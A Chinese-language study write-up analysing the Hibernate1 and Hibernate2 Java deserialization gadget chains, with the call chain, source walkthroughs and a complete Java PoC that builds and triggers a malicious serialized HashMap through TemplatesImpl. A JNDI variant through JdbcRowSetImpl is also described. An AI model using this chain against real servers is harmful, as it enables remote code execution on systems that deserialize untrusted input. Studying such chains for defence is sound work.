# Hibernate1

Hibernate 是开源的一个 ORM 框架，用户量极其庞大，Hibernate1 依旧是利用 TemplatesImpl 这个类，找寻 `_outputProperties` 的 getter 方法的调用链

这条链比较长，和之前CC习惯的东西也涉及不多，用的地方也不是很多，但是作为学习来看的话，还是非常不错的，能对反序列化有更进一步的了解

## 环境搭建

```
<dependency>
    <groupId>org.hibernate</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>4.3.11.Final</version>
</dependency>
```

## 前置知识

### 调用链

```
HashMap.readObject()
    TypedValue.hashCode()
        ValueHolder.getValue()
            ValueHolder.DeferredInitializer().initialize()
                ComponentType.getHashCode()
		            PojoComponentTuplizer.getPropertyValue()
                        AbstractComponentTuplizer.getPropertyValue()
                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
                                TemplatesImpl.getOutputProperties()
```

1. 依赖版本

Hibernate : 3-5

### BasicPropertyAccessor

hibernate中定义了org.hibernate.property.PropertyAccessor接口

![image-20230331134023219](images/1.png)

这个接口中定义了getGetter和getSetter方法，接收 Class 对象和属性名，返回 `org.hibernate.property.Getter` 和 `org.hibernate.property.Setter` 对象，其中的注释也写到了其作用为创建对应属性的getter或者setter

而 `org.hibernate.property.BasicPropertyAccessor` 是对 PropertyAccessor 的标准实现，在这个类中，首先定义了 BasicGetter 和 BasicSetter 两个实现类，重点关注 BasicGetter 类

![image-20230331134334060](images/2.png)

BasicGetter中的get方法可以对传入类的方法进行反射调用，只要能控制传入的target即可命令执行了，这是反序列化需要用到的点

接下来回到 BasicPropertyAccessor，类的 `getGetter` 方法

![image-20230331134615453](images/3.png)

调用了该类的createGetter方法，其中又调用了getGetterOrNull来创建getter

![image-20230331134713117](images/4.png)

通过getterMethod获取Method，获取到的话就会创建一个BasicGetter对象传入对应参数返回

```
private static Method getterMethod(Class theClass, String propertyName) {
   Method[] methods = theClass.getDeclaredMethods();
   for ( Method method : methods ) {
      // if the method has parameters, skip it
      if ( method.getParameterTypes().length != 0 ) {
         continue;
      }
      // if the method is a "bridge", skip it
      if ( method.isBridge() ) {
         continue;
      }

      final String methodName = method.getName();

      // try "get"
      if ( methodName.startsWith( "get" ) ) {
         String testStdMethod = Introspector.decapitalize( methodName.substring( 3 ) );
         String testOldMethod = methodName.substring( 3 );
         if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
            return method;
         }
      }

      // if not "get", then try "is"
      if ( methodName.startsWith( "is" ) ) {
         String testStdMethod = Introspector.decapitalize( methodName.substring( 2 ) );
         String testOldMethod = methodName.substring( 2 );
         if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) {
            return method;
         }
      }
   }

   return null;
}
```

这个方法逻辑比较简单

通过getDeclaredMethods获取传入的class中所有的Method，如果不存在Method，拿就返回null，有的话遍历这个数组

判断Method的参数的个数，如果不为0则跳过，如果方法类型是BRIDGE，则跳过

获取method的名字，如果是get或is开头的话，在 `Introspector.decapitalize()` 方法中还进行的首字母大小写的处理后，通过sub截取去掉前缀后与propertyName这个字符串进行equals，相同的话则返回这个Method，最后再getGetter中返回这个BasicGetter

这种情况下就可以使用这个类来触发 TemplatesImpl 的恶意调用了，示例代码如下：

```java
TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
BasicPropertyAccessor bpa    = new BasicPropertyAccessor();
Getter   getter = bpa.getGetter(TemplatesImpl.class, "outputProperties");
getter.get(tmpl);
```

当然这里明明是说用BasicGetter的get方法进行反射调用，为什么要介绍这些呢

因为在反序列化的时候会调用BasicGetter中定义的readResolve方法，会调用createGetter方法

![image-20230331135928355](images/5.png)

调用createGetter方法获取一个BasicSetter对象，之所以写在readResolve中，主要是为了让序列化和反序列化过程中，BasicGetter对象保持单例

[单例、序列化和readResolve()方法 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/136769959)

### AbstractComponentTuplizer

在知道get方法可以的反射调用Method后，我们需要去找到哪里可以去调用Getter的get方法

![image-20230331140647477](images/6.png)

![image-20230331140709376](images/7.png)

不过对于AbstractComponentTuplizer这个类，是一个抽象类，没有办法调用，我们只有去实例化其子类然后调用其getPropertyValue方法

AbstractComponentTuplizer 有两个子类，一个是 PojoComponentTuplizer，一个是 DynamicMapComponentTuplizer，这对应着 Hibernate 的实体对象的类型，即 pojo 和 dynamic-map。pojo 代表将 Hibernate 类型映射为 Java 实体类，而 dynamic-map 将映射为 Map 对象。

这里选择 PojoComponentTuplizer 类，他的 `getPropertyValues()` 方法会调用其父类的此方法。

![image-20230331141454519](images/8.png)

## 漏洞复现

```
package Unser.Hibernate;

import Unser.Rome.GetTemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.BasicPropertyAccessor;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import sun.reflect.ReflectionFactory;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Payload {
    public static <T> T createWithoutConstructor(Class clazz) throws Exception{
        Constructor constructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor());
        constructor.setAccessible(true);
        return (T)constructor.newInstance();
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();
        Method method = templates.getClass().getDeclaredMethod("getOutputProperties");
        Class basicGetterclass = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor constructor = basicGetterclass.getDeclaredConstructor(Class.class, Method.class,String.class);
        constructor.setAccessible(true);
        BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter) constructor.newInstance(Templates.class,method,"OutputProperties");

        Class clazz = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        PojoComponentTuplizer pojoComponentTuplizer = createWithoutConstructor(clazz);
        Class clazz1 = Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field field0 = clazz1.getDeclaredField("getters");
        field0.setAccessible(true);
        BasicPropertyAccessor.BasicGetter[] basicGetters = {basicGetter};
        field0.set(pojoComponentTuplizer,basicGetters);

        Class clazz2 = Class.forName("org.hibernate.type.ComponentType");
        ComponentType componentType = createWithoutConstructor(clazz2);
        Field field1 = componentType.getClass().getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(componentType,pojoComponentTuplizer);
        Field field2 = componentType.getClass().getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(componentType,1);

        TypedValue typedValue= new TypedValue(componentType,templates);
        HashMap hashMap = new HashMap();
        hashMap.put("a",1);
        Field field = hashMap.getClass().getDeclaredField("table");
        field.setAccessible(true);
        Object[] table = (Object[]) field.get(hashMap);
        // hashmap的索引会根据key的值而变化，如果要改前面的key的话，这里的索引可以用调试的方式改一下
        Object node = table[1];
        Field keyField;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        if (keyField.get(node) instanceof String){
            keyField.set(node, typedValue);
        }

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }
}
```

## 漏洞分析

复现了很多的链子了，都知道hashmap能调用某一些类的hashCode方法，关注到org.hibernate.engine.spi的TypeValue

![image-20230331142247374](images/9.png)

来关注到这个类的构造函数

```
public TypedValue(final Type type, final Object value) {
   this.type = type;
   this.value = value;
   initTransients();
}
```

typ和value是可控的，我们跟进initTransients方法

![image-20230331142337506](images/10.png)

在这里为hashcode进行了初始化，创建了一个ValueHolder对象并赋值了一个DeferredInitiallizer对象且重写了initialize方法

这里是这条链最重要的地方了

了解了hashcode的值后，调用到getvalue方法

![image-20230331143336079](images/11.png)

通过构造函数和前面hashcode的赋值可以知道，这里的valueInitializer是传入的DeferredInitializer类，并且调用了里面重写的initialize方法

![image-20230331144221702](images/12.png)

type是之前调用TypeValue传入的可控参数，这里可以去调用任意类的getHashCode方法

org.hibernate.type.ComponentType类的getHashCode

![image-20230331144312691](images/13.png)

调用到了getPropertyValue，这里的propertySpan需要大于等于1才行

![image-20230331144932804](images/14.png)

调用componentTuplizer的getPropertyValue，这样就和前置知识里面的两个类

这里有一个问题，就是这个类的构造函数会比较复杂，稍微不对就会在某个函数保错，之前也遇到过类似的情况，所以在写poc的时候对于这个类我们一般可以采用反射的方法创建一个空的对象，再通过反射去修改其中需要的参数的值

```
public static <T> T createWithoutConstructor(Class clazz) throws Exception{
    Constructor constructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor());
    constructor.setAccessible(true);
    return (T)constructor.newInstance();
}
```

![image-20230331145243311](images/15.png)

对于还后面的org.hibernate.tuple.component.PojoComponentTuplizer这个类我也采用的是这种方法

在 Hibernate1 5.x 里，实现了 `org.hibernate.property.access.spi.GetterMethodImpl` 类，这个类能够替代 `BasicPropertyAccessor$BasicGetter.get()` 来调用 getter 方法

![image-20230331145746915](images/16.png)

这里就直接用了su18师傅的图，前面的都是一样的，只是后面Getter类是用的GetterMethodImpl这个类类，方法依然是get

# Hibernate2

在之前，其实以为会有很大的差别，其实只是调用的getter方法变了，既然是getter方法，也不一定非需要去加载字节码了，还可以如fastjson一样去jndi注入

前期调用链一样，最后的触发点由 TemplatesImpl 的 `getOutputProperties` 方法换为 JdbcRowSetImpl 的 `getDatabaseMetaData`

调用链如下

```
HashMap.readObject()
    TypedValue.hashCode()
        ValueHolder.getValue()
            ValueHolder.DeferredInitializer().initialize()
                ComponentType.getHashCode()
                    PojoComponentTuplizer.getPropertyValue()
                        AbstractComponentTuplizer.getPropertyValue()
                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
                                JdbcRowSetImpl.getDatabaseMetaData()
```





参考链接

https://zhuanlan.zhihu.com/p/136769959

https://cangqingzhe.github.io/2021/10/20/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/

https://su18.org/post/ysoserial-su18-3/#basicpropertyaccessor